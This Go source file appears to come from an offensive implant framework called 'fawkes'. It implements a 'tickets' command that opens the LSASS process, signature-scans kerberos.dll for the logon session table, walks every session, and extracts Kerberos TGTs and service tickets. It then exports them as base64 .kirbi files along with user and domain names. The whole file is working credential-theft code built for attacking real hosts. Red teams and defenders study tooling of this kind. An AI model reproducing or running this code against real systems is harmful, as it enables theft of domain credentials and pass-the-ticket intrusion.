//go:build windows
// +build windows

package commands

// Kerberos ticket extraction orchestrator for the hashdump "tickets" action.
// Opens LSASS, finds kerberos.dll, sigscan for KerbGlobalLogonSessionTable,
// walks sessions and ticket lists, extracts raw tickets and builds .kirbi files.

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type kerbTicketReport struct {
	Sessions []kerbSessionReport `json:"sessions"`
	Summary  kerbTicketSummary   `json:"summary"`
}

type kerbTicketSummary struct {
	LsassPID       uint32 `json:"lsass_pid"`
	KerbDllBase    string `json:"kerberos_dll_base"`
	KerbDllSize    uint32 `json:"kerberos_dll_size"`
	TableAddr      string `json:"table_addr"`
	SigVariant     string `json:"sig_variant"`
	SessionLayout  string `json:"session_layout"`
	TicketLayout   string `json:"ticket_layout"`
	SessionsFound  int    `json:"sessions_found"`
	TotalTickets   int    `json:"total_tickets"`
	TGTs           int    `json:"tgts"`
	ServiceTickets int    `json:"service_tickets"`
	KirbiExported  int    `json:"kirbi_exported"`
}

type kerbSessionReport struct {
	LUID     string               `json:"luid"`
	UserName string               `json:"username"`
	Domain   string               `json:"domain"`
	Tickets  []kerbTicketEntryRpt `json:"tickets,omitempty"`
}

type kerbTicketEntryRpt struct {
	ListIndex   int    `json:"list_index"`
	ListName    string `json:"list_name"`
	ServiceName string `json:"service_name"`
	ClientName  string `json:"client_name"`
	Domain      string `json:"domain"`
	Flags       string `json:"flags"`
	KeyType     uint32 `json:"key_type"`
	EncType     uint32 `json:"enc_type"`
	StartTime   string `json:"start_time,omitempty"`
	EndTime     string `json:"end_time,omitempty"`
	RenewUntil  string `json:"renew_until,omitempty"`
	TicketSize  int    `json:"ticket_size"`
	KirbiB64    string `json:"kirbi_b64,omitempty"`
}

func executeKerbTickets() structs.CommandResult {
	ch := make(chan structs.CommandResult, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				ch <- errorf("Kerberos tickets: panic: %v", r)
			}
		}()
		ch <- executeKerbTicketsInner()
	}()

	select {
	case r := <-ch:
		return r
	case <-time.After(60 * time.Second):
		return errorf("Kerberos tickets: operation timed out after 60s")
	}
}

func executeKerbTicketsInner() structs.CommandResult {
	pid, err := lsassFindPID()
	if err != nil {
		return errorf("Kerberos tickets: locate lsass.exe: %v", err)
	}

	h, err := lsassOpenForRead(pid)
	if err != nil {
		protection := detectLsassProtection()
		return errorf("Kerberos tickets: open lsass.exe pid=%d: %v\n[!] Protection: %s\n[!] %s",
			pid, err, protection.Summary(), protection.AccessDeniedHint())
	}
	defer windows.CloseHandle(h)

	kerbMod, err := lsassFindModuleInLsass(pid, "kerberos.dll")
	if err != nil {
		return errorf("Kerberos tickets: find kerberos.dll in lsass: %v", err)
	}

	kerbBytes, err := lsassReadModuleBytes(h, kerbMod)
	if err != nil {
		return errorf("Kerberos tickets: read kerberos.dll (base=0x%X size=%d): %v",
			kerbMod.Base, kerbMod.Size, err)
	}

	tableAddr, sigVariant, err := findKerbSessionTable(kerbBytes, kerbMod.Base)
	if err != nil {
		return errorf("Kerberos tickets: %v", err)
	}

	reader := lsassRemoteReader{h: h}
	sessLayout, tickLayout := selectKerbLayouts(0) // default to modern layout

	// Probe the first session found in any hash table slot to auto-detect
	// the correct struct layout.
	probeSlots := detectHashTableSize(reader, tableAddr)
	for slot := 0; slot < probeSlots; slot++ {
		slotAddr := tableAddr + uintptr(slot*16)
		head, headErr := readListEntry(reader, slotAddr)
		if headErr != nil || head.Flink == 0 || head.Flink == slotAddr {
			continue
		}
		probeBase := head.Flink - uintptr(sessLayout.ListEntryOff)
		sessLayout = probeKerbSessionLayout(reader, probeBase, sessLayout)
		break
	}

	sessions, err := walkKerbSessionList(reader, tableAddr, sessLayout)
	if err != nil && len(sessions) == 0 {
		return errorf("Kerberos tickets: walk session list: %v", err)
	}

	var diagOutput string

	// Probe the ticket struct layout using the first ticket found.
	var ticketProbeMsg string
	var ticketDiagOutput string
	ticketProbed := false
	for _, sess := range sessions {
		for _, tl := range []struct {
			off int
			idx int
		}{{sessLayout.Tickets1Off, 1}, {sessLayout.Tickets2Off, 2}, {sessLayout.Tickets3Off, 3}} {
			if tl.off+16 > len(sess.Raw) {
				continue
			}
			listHeadAddr := sess.Address + uintptr(tl.off)
			head2, headErr2 := readListEntry(reader, listHeadAddr)
			if headErr2 != nil || head2.Flink == 0 || head2.Flink == listHeadAddr {
				continue
			}
			// Read an extended buffer from the first ticket for probing
			probeBuf, pErr := reader.Read(head2.Flink, 0x200)
			if pErr != nil || len(probeBuf) < 0x100 {
				continue
			}
			tickLayout, ticketProbeMsg = probeKerbTicketLayout(reader, head2.Flink, tickLayout)
			ticketDiagOutput = ticketDiagHexDump(probeBuf, head2.Flink, tickLayout)
			ticketProbed = true
			break
		}
		if ticketProbed {
			break
		}
	}

	// Diagnostic: dump the ticket list area (0xE0-0x148) from the first session
	// that has a valid username, to verify ticket list offsets.
	for _, sess := range sessions {
		if sess.UserName == "" {
			continue
		}
		dumpStart := 0xE0
		dumpEnd := 0x148
		if dumpEnd > len(sess.Raw) {
			dumpEnd = len(sess.Raw)
		}
		if dumpStart < dumpEnd {
			diagOutput += fmt.Sprintf("\n[SESS TICKET AREA] LUID=0x%X user=%q (offsets 0x%02X-0x%02X)\n",
				sess.LUID, sess.UserName, dumpStart, dumpEnd)
			diagOutput += fmt.Sprintf("[SESS TICKET AREA] Expected: T1=0x%02X T2=0x%02X T3=0x%02X\n",
				sessLayout.Tickets1Off, sessLayout.Tickets2Off, sessLayout.Tickets3Off)
			for off := dumpStart; off < dumpEnd; off += 16 {
				end := off + 16
				if end > dumpEnd {
					end = dumpEnd
				}
				hex := ""
				for j := off; j < end; j++ {
					hex += fmt.Sprintf("%02X ", sess.Raw[j])
				}
				// Check if this offset is a self-referencing LIST_ENTRY
				marker := ""
				if off+16 <= len(sess.Raw) {
					flink := uintptr(binary.LittleEndian.Uint64(sess.Raw[off : off+8]))
					blink := uintptr(binary.LittleEndian.Uint64(sess.Raw[off+8 : off+16]))
					listAddr := sess.Address + uintptr(off)
					if flink == listAddr && blink == listAddr {
						marker = " ← self-ref LIST_ENTRY (empty)"
					} else if flink > 0x7FF000000000 && flink < 0x800000000000 {
						marker = fmt.Sprintf(" ← heap ptr? flink=0x%X", flink)
					}
				}
				diagOutput += fmt.Sprintf("[SESS TICKET AREA] +%04X: %-48s%s\n", off, hex, marker)
			}
		}
		break
	}

	var totalTickets, tgts, serviceTickets, kirbiExported int
	sessionReports := make([]kerbSessionReport, 0, len(sessions))
	var outputLines []string

	for i := range sessions {
		sess := &sessions[i]

		// Extract tickets from all three lists
		sess.Tickets = extractKerbTickets(reader, sess.Raw, sess.Address, sessLayout, tickLayout)

		if len(sess.Tickets) == 0 {
			continue
		}

		sessRpt := kerbSessionReport{
			LUID:     fmt.Sprintf("0x%016X", sess.LUID),
			UserName: sess.UserName,
			Domain:   sess.Domain,
		}

		for _, t := range sess.Tickets {
			totalTickets++
			listName := "service"
			if t.ListIndex == 1 {
				listName = "TGT"
				tgts++
			} else {
				serviceTickets++
			}

			entry := kerbTicketEntryRpt{
				ListIndex:   t.ListIndex,
				ListName:    listName,
				ServiceName: t.ServiceName,
				ClientName:  t.ClientName,
				Domain:      t.DomainName,
				Flags:       formatTicketFlags(t.TicketFlags),
				KeyType:     t.KeyType,
				EncType:     t.TicketEncType,
				TicketSize:  len(t.TicketBytes),
			}

			if !t.StartTime.IsZero() {
				entry.StartTime = t.StartTime.Format(time.RFC3339)
			}
			if !t.EndTime.IsZero() {
				entry.EndTime = t.EndTime.Format(time.RFC3339)
			}
			if !t.RenewUntil.IsZero() {
				entry.RenewUntil = t.RenewUntil.Format(time.RFC3339)
			}

			if len(t.TicketBytes) > 0 {
				kirbi, kErr := buildKirbi(t)
				if kErr == nil && len(kirbi) > 0 {
					entry.KirbiB64 = base64.StdEncoding.EncodeToString(kirbi)
					kirbiExported++
				}
			}

			sessRpt.Tickets = append(sessRpt.Tickets, entry)

			// Build human-readable output line
			line := fmt.Sprintf("[%s] %s\\%s → %s (%s)",
				listName, sess.Domain, sess.UserName, t.ServiceName, t.DomainName)
			if !t.EndTime.IsZero() {
				line += fmt.Sprintf(" expires %s", t.EndTime.Format("2006-01-02 15:04"))
			}
			outputLines = append(outputLines, line)
		}

		sessionReports = append(sessionReports, sessRpt)
	}

	summary := kerbTicketSummary{
		LsassPID:       pid,
		KerbDllBase:    fmt.Sprintf("0x%X", kerbMod.Base),
		KerbDllSize:    kerbMod.Size,
		TableAddr:      fmt.Sprintf("0x%X", tableAddr),
		SigVariant:     sigVariant,
		SessionLayout:  sessLayout.Name,
		TicketLayout:   tickLayout.Name,
		SessionsFound:  len(sessions),
		TotalTickets:   totalTickets,
		TGTs:           tgts,
		ServiceTickets: serviceTickets,
		KirbiExported:  kirbiExported,
	}

	report := kerbTicketReport{
		Sessions: sessionReports,
		Summary:  summary,
	}

	jsonBytes, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return errorf("Kerberos tickets: marshal report: %v", err)
	}

	var header strings.Builder
	header.WriteString(fmt.Sprintf("=== Kerberos Ticket Extraction ===\n"))
	header.WriteString(fmt.Sprintf("LSASS PID: %d | kerberos.dll: %s (size %d)\n",
		pid, summary.KerbDllBase, kerbMod.Size))
	header.WriteString(fmt.Sprintf("Signature: %s | Table: %s\n", sigVariant, summary.TableAddr))
	header.WriteString(fmt.Sprintf("Sessions: %d | Tickets: %d (TGTs: %d, Service: %d) | Kirbi: %d\n",
		len(sessions), totalTickets, tgts, serviceTickets, kirbiExported))
	if ticketProbeMsg != "" {
		header.WriteString(fmt.Sprintf("Ticket probe: %s\n", ticketProbeMsg))
	}
	header.WriteString("\nAll sessions:\n")
	for i := range sessions {
		s := &sessions[i]
		tktCount := len(s.Tickets)
		header.WriteString(fmt.Sprintf("  [%d] LUID=0x%X user=%q domain=%q tickets=%d\n",
			i, s.LUID, s.UserName, s.Domain, tktCount))
	}
	header.WriteString("\n")

	for _, line := range outputLines {
		header.WriteString(line + "\n")
	}

	// If tickets were found but have empty service names, include a hex dump
	// of the first ticket for debugging struct offsets.
	if totalTickets > 0 && kirbiExported == 0 && ticketDiagOutput != "" {
		diagOutput += "\n" + ticketDiagOutput
	}

	return successResult(header.String() + diagOutput + "\n" + string(jsonBytes))
}
